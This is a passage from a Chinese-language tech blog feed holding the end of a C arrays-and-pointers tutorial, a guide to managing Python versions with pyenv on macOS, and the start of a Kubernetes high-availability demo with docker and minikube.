class="code"><pre><span class="line"><span class="keyword">int</span> arr_init3[] = {[<span class="number">2</span>] = <span class="number">2</span>};</span><br></pre></td></tr></tbody></table></figure></li></ol><hr><p>指標的宣告，需要關鍵字 <code>*</code>，該關鍵字可以緊鄰變數或是型態，本質上沒有差別：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* ptr1;</span><br><span class="line"><span class="keyword">int</span> *ptr2;</span><br></pre></td></tr></tbody></table></figure><p>但若是我們宣告指標卻不指定初始值，這件事是非常危險的！</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *ptr1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr1); <span class="comment">// 0x1125ce025</span></span><br></pre></td></tr></tbody></table></figure><p>該指標在未宣告的情況下，編譯器會直接指定該位置上本來就存有的值（這個值沒有意義，是作業系統殘留的值），如果沒有特別注意，操作這個位置會發生錯誤，甚至覆寫到需要的資料。</p><p>我們會建議指標在宣告時還沒有特定的空間或位置可以指定時，先使用 <code>NULL</code> 來指定。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr); <span class="comment">//0x0</span></span><br></pre></td></tr></tbody></table></figure><h2 id="陣列索引與指標"><a href="#陣列索引與指標" class="headerlink" title="陣列索引與指標"></a>陣列索引與指標</h2><p>陣列的變數名稱其實就是一個指標，指向陣列開頭元素的記憶體位置。這也就是為什麼陣列索引會從 0 開始計算，因為索引的意義其實是與起始位置的位移量。我們可以用以下範例看到起始位置的值就是直接對陣列名稱取值（dereference）。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Address: %p, Value: %d\n"</span>, arr, *arr);</span><br><span class="line"><span class="comment">// Address: 0x7ffee98be05c, Value: 1</span></span><br></pre></td></tr></tbody></table></figure><p>如果對該變數遞增，會發現記憶體位置相差了 4 格，原因是因為我們在宣告陣列時，指定了陣列的型態是 <code>int</code>，如此以來我們在進行取值的動作時，CPU 才知道下一個位置在哪邊。有趣的是，一般我們所使用的取值動作 <code>arr[1]</code> 其實就等於 <code>*(arr + 1)</code>。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Address: %p, Value: %d\n"</span>, arr + <span class="number">1</span>, *(arr + <span class="number">1</span>));</span><br><span class="line"><span class="comment">// Address: 0x7ffee1dca060, Value: 2</span></span><br></pre></td></tr></tbody></table></figure><p>有了以上的概念之後，不難理解為何我們在設定函數的參數引述時，可以將陣列設定為：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *arr)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>或是這樣設定：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>這兩種指定方式是一模一樣的（對於編譯器來說）。在函式原型中，參數的名稱是沒有意義的，只有型態有意義，所以也可以指定為：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>但是陣列名稱與指標也不能說是完全一模一樣的東西。</p><h2 id="陣列傳遞與指標"><a href="#陣列傳遞與指標" class="headerlink" title="陣列傳遞與指標"></a>陣列傳遞與指標</h2><p>在 C 語言中，傳遞陣列就是傳遞陣列的起始記憶體位置，所以我們可以用指標來接收陣列：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string"><stdio.h></span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span> arr); <span class="comment">// 12</span></span><br><span class="line">    foo(arr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *ar)</span> </span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span> ar); <span class="comment">// 8</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>以上程式會印出：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">8</span><br></pre></td></tr></tbody></table></figure><p>先印出 12 的原因是，陣列在宣告時就已經知道了陣列長度，int 型態在我的作業系統中佔用了 4 bytes，所以 4x3=12。</p><p>8 的話則是代表指標變數本身佔據了 8 bytes 的空間。非常合理，因為我的電腦是 64-bit 的作業系統，要可以完整定址全部空間需要 8 bytes（64 / 8 = 8）。</p><p>所以為什麼剛才提到：「陣列名稱與指標也不能說是完全一模一樣的東西」。用 <code>sizeof</code> 進行操作時，會發現兩者還是有一點差別！（不過在沒有進行參數傳遞前，幾乎是沒有差別的。）</p><p>由以上的例子可以發現，陣列的變數名稱可以進一步得知陣列長度的，只要使用 <code>sizeof</code> 運算子即可：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[<span class="number">3</span>] = {<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>};</span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">sizeof</span> arr / <span class="keyword">sizeof</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, len); <span class="comment">//3</span></span><br></pre></td></tr></tbody></table></figure><p><code>sizeof</code> 後面如果不是接基本型態，是不需要括號的。如果接上基本型態才需要括號，像是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>));   <span class="comment">//1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">short</span>));  <span class="comment">//2</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));    <span class="comment">//4</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lu\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">long</span>));   <span class="comment">//8</span></span><br><span class="line"><span class="comment">//請注意！不同型態的空間大小是由編譯器依照作業系統去分配以及實作，所以有可能不同電腦上面的結果不一致。</span></span><br></pre></td></tr></tbody></table></figure><p>對於函式來說，它只有辦法得知陣列起始記憶體位置，無法得知總長度。或是可以直接說，對於函數來說，他並不知道傳進來的東西是一個陣列，只知道是一個記憶體位置，指向的型態也知道，其他事情對於這個函數來說都無法得知。</p><p>這也是為何我們時常在接收陣列時，會額外接收一個參數，用來表示陣列的總長度。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> *arr, <span class="keyword">int</span> n)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="二維陣列"><a href="#二維陣列" class="headerlink" title="二維陣列"></a>二維陣列</h2><p>在宣告一維陣列時，可以直接填上元素，不指定陣列大小，可是在二維陣列這樣操作的話，會發生錯誤：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">app.c:7:12: error: array has incomplete element type 'int []'</span></span><br><span class="line"><span class="comment">        int td_arr[][] = {{1, 2}, {3, 4}, {5, 6}};</span></span><br><span class="line"><span class="comment">                  ^</span></span><br><span class="line"><span class="comment">1 error generated.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></tbody></table></figure><p>我們要先重新理解二維陣列，二維陣列不過是一個陣列，該陣列的值也是一個陣列（<code>{1, 2}</code>, <code>{3, 4}</code>, <code>{5, 6}</code>），沒有多特別，僅此而已。</p><p>陣列只接受第一層不指定大小而已，用後面的元素個數自己推算（一維陣列只有一層，所以你可能會認為一維陣列比較聰明）。</p><p>所以我們應該要告訴編譯器，內層陣列的大小，這樣他才有辦法幫我們將所需要的空間準備好，我們應該這樣子撰寫程式：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][<span class="number">2</span>] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br></pre></td></tr></tbody></table></figure><p>第一層有幾個元素可以不用指定（就像一維陣列），但是我們需要告訴編譯器，內容陣列的寬度有多大。我們總共花了 24 bytes 的空間，4 bytes(int size) x 6(elements) = 24。</p><p>接下來，我們嘗試將二維陣列中我們需要的值取出：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *td_arr[<span class="number">1</span>]);  <span class="comment">//3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (*td_arr)[<span class="number">1</span>]);<span class="comment">//2</span></span><br></pre></td></tr></tbody></table></figure><p><code>[]</code> 的優先權比 <code>*</code> 還要高，所以在第一個範例中我們會先找到 <code>td_arr</code> 中的第二個元素（第 1 個是索引 0）然後取值。第二個元素就是 <code>{3, 4}</code>，在文章前段的一維陣列有講過直接取值就是對第一個元素（索引 0）取值。所以 <code>{3, 4}</code> 的第一個元素就是 <code>3</code>。</p><p>第二個範例則是先取值，我們會拿到 <code>td_arr</code> 的第 1 個元素（索引 0），也就是 <code>{1, 2}</code> 接下來取出第二個元素（索引 1），得到 <code>2</code>。</p><p>也可以將上述寫成是不含有 <code>[]</code> 的表示法，如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, **(td_arr + <span class="number">1</span>));<span class="comment">//3</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(*td_arr + <span class="number">1</span>));<span class="comment">//2</span></span><br></pre></td></tr></tbody></table></figure><p>前面段落也有提到 <code>[]</code> 與 <code>*(arr + offset)</code> 的寫法可以互相替換，就不再贅述。</p><h2 id="指標與二維陣列"><a href="#指標與二維陣列" class="headerlink" title="指標與二維陣列"></a>指標與二維陣列</h2><p>接下來我們要理解如何用指標去操作二維陣列，首先我們需要先宣告一個指向二維陣列的指標：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> (*td_ptr)[<span class="number">2</span>];</span><br></pre></td></tr></tbody></table></figure><p>該宣告的意思是宣告一個指標，指向大小為 2 的陣列，該陣列內容為 <code>int</code> 型態。</p><p>為何不直接寫：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *td_ptr[<span class="number">2</span>]; <span class="comment">// 可以看成 int *(td_ptr[2]);</span></span><br></pre></td></tr></tbody></table></figure><p>原因是因為優先權帶來的影響並不同（<code>[]</code> 的優先權較大），以上宣告的意思是產生一個大小為 2 的陣列，陣列內容是兩個指向 <code>int</code> 的指標。如下：</p><p><code>{ptr1, ptr2}</code></p><p>宣告完指標之後，我們可以將該指標，指向我們的二維陣列：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> td_arr[][<span class="number">2</span>] = {{<span class="number">1</span>, <span class="number">2</span>}, {<span class="number">3</span>, <span class="number">4</span>}, {<span class="number">5</span>, <span class="number">6</span>}};</span><br><span class="line"><span class="keyword">int</span> (*td_ptr)[<span class="number">2</span>];</span><br><span class="line">td_ptr = td_arr;</span><br></pre></td></tr></tbody></table></figure><p>接著一樣可以用指標來操作該陣列：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, td_ptr[<span class="number">2</span>][<span class="number">0</span>]); <span class="comment">//5</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, td_ptr[<span class="number">2</span>][<span class="number">1</span>]); <span class="comment">//6</span></span><br></pre></td></tr></tbody></table></figure><p>如果需要設定函數原型的話：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> (*ar)[<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>或是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">2</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>皆可以用來接收。</p><p>我想看到這邊，如果你沒有其他疑問的話。應該可以稍微理解為何我們在傳遞二維陣列時，會使用這樣子的寫法了！這樣子理解的話也可以推廣到多維陣列中，像是：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">6</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> (*arr)[<span class="number">2</span>][<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">6</span>])</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h2><p>希望這篇文章可以讓大家更加理解 C 語言陣列與指標撰寫過程中的背景原因，在網路上看到太多文章只有提到宣告或是使用的方式，但是卻沒有加以描述任何原因，導致很多人只知道寫法但不清楚為何應該這樣子撰寫。</p><p>希望大家看完文章有所收穫 😄！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="c" scheme="https://blog.yiyu0x.org/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>優雅的在 macOS 上使用 Python</title>
    <link href="https://blog.yiyu0x.org/2020/01/11/"/>
    <id>https://blog.yiyu0x.org/2020/01/11/</id>
    <published>2020-01-11T05:38:24.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="為什要要這樣做？"><a href="#為什要要這樣做？" class="headerlink" title="為什要要這樣做？"></a>為什要要這樣做？</h2><p>我們都知道 macOS 有 Python，為了不將預設的環境弄髒。比較推薦的做法是透過 <code>pyenv</code> 這套 Python 版本管理工具來安裝不同的 Python 版本，如此一來要切換不同的版本也方便，畢竟還是有很多專案是用 Python2 在維護。</p><p>如果你沒有使用不同的 Python 版本需求也可以無視這篇，但是建議至少用 <code>virtualenv</code> 來開發專案，才不會把內建的 Python 環境弄成一團亂。</p><h2 id="檢查目前版本"><a href="#檢查目前版本" class="headerlink" title="檢查目前版本"></a>檢查目前版本</h2><p>目前我的 macOS 的 Python 是預設的 Python：</p><p><code>which python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python</span><br></pre></td></tr></tbody></table></figure><p><code>python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Python 2.7 is not recommended.</span><br><span class="line">This version is included in macOS for compatibility with legacy software.</span><br><span class="line">Future versions of macOS will not include Python 2.7.</span><br><span class="line">Instead, it is recommended that you transition to using 'python3' from within Terminal.</span><br><span class="line"></span><br><span class="line">Python 2.7.16 (default, Nov  9 2019, 05:55:08)</span><br><span class="line">[GCC 4.2.1 Compatible Apple LLVM 11.0.0 (clang-1100.0.32.4) (-macos10.15-objc-s on darwin</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><h2 id="用-pyenv-來管理-Python-版本"><a href="#用-pyenv-來管理-Python-版本" class="headerlink" title="用 pyenv 來管理 Python 版本"></a>用 pyenv 來管理 Python 版本</h2><p>首先，先安裝 pyenv：</p><p><code>brew install pyenv</code></p><p>安裝完畢後確認自己的環境變數：</p><p><code>echo $PATH</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</span><br></pre></td></tr></tbody></table></figure><h3 id="初始設定設定"><a href="#初始設定設定" class="headerlink" title="初始設定設定"></a>初始設定設定</h3><p><code>~/.zshrc</code> 請自行替換成你的 shell 的設定檔位置（bash 的話是 <code>~/.bash_profile</code>）：</p><p><code>echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zshrc</code></p><p>重新載入 shell：</p><p><code>source ~/.zshrc</code></p><p>重新確認環境變數：</p><p><code>echo $PATH</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/yiyuchang/.pyenv/shims:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</span><br></pre></td></tr></tbody></table></figure><p>可以發現家目錄下多了一個 <code>.pyenv/shims</code> 管理這些套件，這也是 <code>pyenv</code> 進行神秘魔法的地方 🧙‍♂️</p><h2 id="開始使用-pyenv"><a href="#開始使用-pyenv" class="headerlink" title="開始使用 pyenv"></a>開始使用 pyenv</h2><p>確認目前 Python 版本為系統版本：</p><p><code>pyenv global</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system</span><br></pre></td></tr></tbody></table></figure><p>顯示可取用的 Python 版本<br><code>pyenv install --list</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Available versions:</span><br><span class="line">  2.1.3</span><br><span class="line">  2.2.3</span><br><span class="line">  2.3.7</span><br><span class="line">  2.4.0</span><br><span class="line">  2.4.1</span><br><span class="line">  (略)</span><br><span class="line">  stackless-3.4-dev</span><br><span class="line">  stackless-3.4.1</span><br><span class="line">  stackless-3.4.2</span><br><span class="line">  stackless-3.4.7</span><br><span class="line">  stackless-3.5.4</span><br></pre></td></tr></tbody></table></figure><p>裡面有各式各樣的 Python interpreter，在這邊，我想使用官方的 3.8.1 版本，先進行安裝：</p><p><code>pyenv install 3.8.1</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python-build: use openssl@1.1 from homebrew</span><br><span class="line">python-build: use readline from homebrew</span><br><span class="line">Downloading Python-3.8.1.tar.xz...</span><br><span class="line">-> https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz</span><br><span class="line">Installing Python-3.8.1...</span><br><span class="line">python-build: use readline from homebrew</span><br><span class="line">python-build: use zlib from xcode sdk</span><br><span class="line">Installed Python-3.8.1 to /Users/yiyuchang/.pyenv/versions/3.8.1</span><br></pre></td></tr></tbody></table></figure><p>查看目前本地端所有的 Python 版本（有星號代表目前正在使用）：</p><p><code>pyenv versions</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* system (set by /Users/yiyuchang/.pyenv/version)</span><br><span class="line">  3.8.1</span><br></pre></td></tr></tbody></table></figure><p>將 Python 切換到剛才下載的 3.8.1：</p><p><code>pyenv global 3.8.1</code><br><code>pyenv versions</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  system</span><br><span class="line">* 3.8.1 (set by /Users/yiyuchang/.pyenv/version)</span><br></pre></td></tr></tbody></table></figure><p>切換不一定要使用 <code>global</code>, <code>global</code> 代表全域的 Python 版本，另外兩種方式<code>local</code> 或是 <code>shell</code> 有興趣的朋友可以去了解一下，可以更彈性的進行 Python 版本管理</p><p>接著確認 Python 是不是真的切換到我們剛才下載的 <code>3.8.1</code> 了：</p><p><code>which python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Users/yiyuchang/.pyenv/shims/python</span><br></pre></td></tr></tbody></table></figure><p><code>python</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python 3.8.1 (default, Jan 11 2020, 12:25:19)</span><br><span class="line">[Clang 11.0.0 (clang-1100.0.33.16)] on darwin</span><br><span class="line">Type "help", "copyright", "credits" or "license" for more information.</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><p>大功告成！如此一來之後就可以輕鬆地在不同專案下使用 Python 了。不過建議在不同專案還是要使用 <code>virtualenv</code> 來管理，否則套件全部會裝在本機的全域的 Python 環境上，如果不同專案要用到不同版本的套件，又會變得一團糟！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://blog.yiyu0x.org/tags/python/"/>
    
      <category term="macos" scheme="https://blog.yiyu0x.org/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>快速體驗 kubernetes 的強大之處</title>
    <link href="https://blog.yiyu0x.org/2020/01/08/"/>
    <id>https://blog.yiyu0x.org/2020/01/08/</id>
    <published>2020-01-08T05:17:53.000Z</published>
    <updated>2025-04-12T20:59:43.594Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>容器技術近年來非常流行，相信各位在不同地方多少有聽過 <code>kubernetes</code>（或是它的簡稱 <code>k8s</code>）這項技術。但是很多人了解 <code>k8s</code> 之後會被這個技術嚇到，原因是因為有大量的名詞，像是 <code>Pod</code>, <code>Service</code> 等等（這些元件數量高達 60 多種），然後又有一大堆的架構圖，很多人可能還沒開始就先放棄了。</p><p>這篇文章的目的沒有要教大家了解 <code>k8s</code> 背後的觀念，而是要透過簡單的小實驗來讓大家了解 <code>k8s</code> 的作用到底為何？讓大家有點感覺，後續如果各位要深入了解，可能也會有點幫助。</p><p>簡單來說 <code>k8s</code> 是一項可以管理容器的技術，而且可以分散式的管理。意思就是容器掛掉之後 <code>k8s</code> 會自動偵測並且讓容器重新啟動。當然還有非常多的功能，但是主要的核心目的就是保持應用程式的 <code>高可用性（high availability）</code>（簡稱 HA）。</p><p>本篇實驗會透過一個簡單例子來讓大家看到 <code>k8s</code> 達成高可用性的成效。</p><h2 id="實驗必備"><a href="#實驗必備" class="headerlink" title="實驗必備"></a>實驗必備</h2><ul><li>docker</li><li>minikube</li></ul><h2 id="一般容器"><a href="#一般容器" class="headerlink" title="一般容器"></a>一般容器</h2><p>在開始之前，大家可以先跑這個容器（yiyu0x/current-time）起來玩玩看</p><p><code>docker run -d -p 3000:3000 yiyu0x/current-time</code></p><p>這個容器會在 localhost 3000 port 開一個顯示目前時間的 API：</p><p>如果順利的話訪問 <code>localhost:3000</code> 會得到：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Current time is 4:2:48</span><br></pre></td></tr></tbody></table></figure><p>我們可以後過 <code>docker ps</code> 來確認這個 container 正確無誤的運作：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api ❯ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">d5662a916aed        yiyu0x/current-time   "docker-entrypoint.s…"   10 seconds ago      Up 8 seconds        0.0.0.0:3000->3000/tcp   tender_hypatia</span><br></pre></td></tr></tbody></table></figure><p>但是我們如果去戳 <code>localhost:3000/bye</code> 這個位置的話，會發現容器掛掉了：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api ❯ docker ps</span><br></pre></td></tr></tbody></table></figure><p>這個行為模擬出當應用程式意外結束的情況。</p><h2 id="導入-k8s"><a href="#導入-k8s" class="headerlink" title="導入 k8s"></a>導入 k8s</h2><p>建立一個 <code>pod</code> 內容是剛才的 <code>current-time</code> 的 <code>container</code>：<br><code>kubectl run --image=yiyu0x/current-time curr-time --generator=run-pod/v1</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api ❯ kubectl get po</span><br><span class="line">NAME        READY   STATUS              RESTARTS   AGE</span><br><span class="line">curr-time   0/1     ContainerCreating   0          16s</span><br></pre></td></tr></tbody></table></figure><p>將他 <code>expose</code> 出去：</p><p><code>kubectl expose pod curr-time --port 3000 --type=NodePort</code></p><p>取得位置並且訪問：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/dev/k8s-post/my-api ❯ minikube service curr-time --url</span><br><span class="line">http://192.168.64.6:30948</span><br></pre></td></tr></tbody></table></figure><p>此時建議再開一個 terminal 的 tab 使用:<br><code>watch kubectl get po</code><br>（感謝學長 Jerry Wang 指正，可以用 <code>kubectl get po -w</code> 就不用額外安裝 watch 指令了！）</p><p>監測該 <code>pod</code> 的狀態並且去戳 